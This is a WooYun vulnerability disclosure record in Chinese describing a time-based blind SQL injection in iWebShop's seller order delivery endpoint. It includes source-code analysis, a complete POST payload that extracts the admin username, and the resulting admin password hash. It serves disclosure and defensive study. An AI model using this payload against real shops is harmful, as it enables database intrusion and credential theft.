{"id": 39703, "wybug_id": "wooyun-2015-093444", "wybug_title": "Iwebshop最新版SQL注入一枚", "wybug_corp": "jooyea.net", "wybug_author": "路人甲", "wybug_date": "2015-04-09 12:39", "wybug_open_date": "2015-07-13 12:40", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-14：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-06-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-13：\t细节向公众公开  简要描述： Iwebshop最新版SQL注入一枚 详细说明：  看到wooyun上有人提了几个iweshop（2014-11-18更新）的漏洞（ WooYun: iWebShop开源电子商务系统SQL注入漏洞 ），去官网看了看，在2014-12-16 已更新到了 iwebshop2.9.14121000，下下来研究研究，希望不要重复。注入一枚：POST /index.php?controller=seller&action=order_delivery_doc   POST参数中的sendgoods过滤不完全，注入成功，文件在/controllers/seller.php的order_delivery_doc()方法中看看代码/controllers/seller.php\npublic function order_delivery_doc()\t{\t \t//获得post变量参数\t \t$order_id = IFilter::act(IReq::get('id'),'int');\t \t//发送的商品关联\t \t$sendgoods = IFilter::act(IReq::get('sendgoods'));\t \tif(!$sendgoods)\t \t{\t \t\tdie('请选择要发货的商品');\t \t}\t \tOrder_Class::sendDeliveryGoods($order_id,$sendgoods,$this->seller['seller_id'],'seller');\t \t$this->redirect('order_list');\t}\n$sendgoods 是这样获得的$sendgoods = IFilter::act(IReq::get('sendgoods'));，去看看IFilter::act/lib/core/util/filter_class.php\n/**\t * @brief 对字符串进行过滤处理\t * @param  string $str      被过滤的字符串\t * @param  string $type     过滤数据类型 值: int, float, string, text, bool, url\t * @param  int    $limitLen 被输入的最大字符个数 , 默认不限制;\t * @return string 被过滤后的字符串\t * @note   默认执行的是string类型的过滤\t */\tpublic static function act($str,$type = 'string',$limitLen = false)\t{\t\tif(is_array($str))\t\t{\t\t\tforeach($str as $key => $val)\t\t\t{\t\t\t\t$resultStr[$key] = self::act($val, $type, $limitLen);\t\t\t}\t\t\treturn $resultStr;\t\t}\t\telse\t\t{\t\t\tswitch($type)\t\t\t{\t\t\t\tcase \"int\":\t\t\t\t\treturn intval($str);\t\t\t\t\tbreak;\t\t\t\tcase \"float\":\t\t\t\t\treturn floatval($str);\t\t\t\t\tbreak;\t\t\t\tcase \"text\":\t\t\t\t\treturn self::text($str,$limitLen);\t\t\t\t\tbreak;\t\t\t\tcase \"bool\":\t\t\t\t\treturn (bool)$str;\t\t\t\t\tbreak;\t\t\t\tcase \"url\":\t\t\t\t\treturn self::clearUrl($str);\t\t\t\t\tbreak;\t\t\t\tcase \"filename\":\t\t\t\t\treturn self::fileName($str);\t\t\t\t\tbreak;\t\t\t\tdefault:\t\t\t\t\treturn self::string($str,$limitLen);\t\t\t\t\tbreak;\t\t\t}\t\t}\t}\n因为在获取$sendgoods时，act()没有指定第二个类型参数，所以，把$sendgoods  当作string过滤，这里是数字型的，不用闭合单引号。再去看看Order_Class::sendDeliveryGoods\n无关代码//获得delivery_doc表的对象\t \t$tb_delivery_doc = new IModel('delivery_doc');\t \t$tb_delivery_doc->setData($paramArray);\t \t$deliveryId = $tb_delivery_doc->add();\t\t//更新发货状态\t \t$orderGoodsDB = new IModel('order_goods');\t \t$orderGoodsRow = $orderGoodsDB->getObj('is_send = 0 and order_id = '.$order_id,'count(*) as num');\t\t$sendStatus = 2;//部分发货\t \tif(count($order_goods_relation) >= $orderGoodsRow['num'])\t \t{\t \t\t$sendStatus = 1;//全部发货\t \t}\t \tforeach($order_goods_relation as $key => $val)\t \t{\t \t\t$orderGoodsDB->setData(array(\t \t\t\t\"is_send\"     => 1,\t \t\t\t\"delivery_id\" => $deliveryId,\t \t\t));\t \t\t$orderGoodsDB->update(\" id = {$val} \");\t \t}无关代码\n其中的$order_goods_relation即为$sendgoods，全程没有再过滤，造成了注入测试方法：测试方法：申请开店后，发布一个商品并且上架后->另一个账号购买(选择货到付款)->发货Payload:POST提交\norder_no=20150118220152748220&id=5&weight_total=345&user_id=3&freight=20.00&name=%E9%9B%B7%E5%85%B4%E5%8A%9B&telphone=18601402547&mobile=18601402547&postcode=100000&freight_id=1&delivery_code=123124&province=110000&city=110100&area=110116&address=%E5%8C%97%E4%BA%AC%E5%B8%82%E8%A5%BF%E7%9B%B4%E9%97%A8%E5%86%85%E5%A4%A7%E8%A1%97186%E5%8F%B7&note=&sendgoods%5B%5D=-1 or(select if(ord(mid((select admin_name from iwebshop_admin limit 0,1),1,1))=98,sleep(1),0))\n因为是time-based blind 注入，猜测管理员用户名的第一个字母时，若错误，延迟2s左右，如下图\n\n若正确，延迟3s左右，如下图\n\n按上面的方法依次做下去（burp intruder或者自己写个脚本跑），可测试管理员用户名为：admin，密码为： f6fdffe48c908deb0f4c3bd36c032e72   漏洞证明：  见 详细说明   修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-07-13 12:40 厂商回复：  漏洞Rank：8  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}